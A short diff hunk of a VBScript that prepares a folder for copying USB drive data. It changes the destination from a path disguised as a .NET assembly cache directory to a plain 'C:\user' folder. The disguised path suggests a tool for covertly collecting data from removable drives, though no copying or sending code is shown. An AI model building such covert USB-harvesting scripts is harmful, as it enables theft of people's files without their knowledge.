@@ -5,7 +5,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Set wmi = GetObject("winmgmts:\\.\root\cimv2")
 
 ' Main folder where USB data will be copied
-destination = "C:\window\user\assembly\GAC\ADODB\7.0.3300.0__b03f5f7f11d50a3a"
+destination = "C:\user"
 If Not fso.FolderExists(destination) Then
     fso.CreateFolder(destination)
 End If
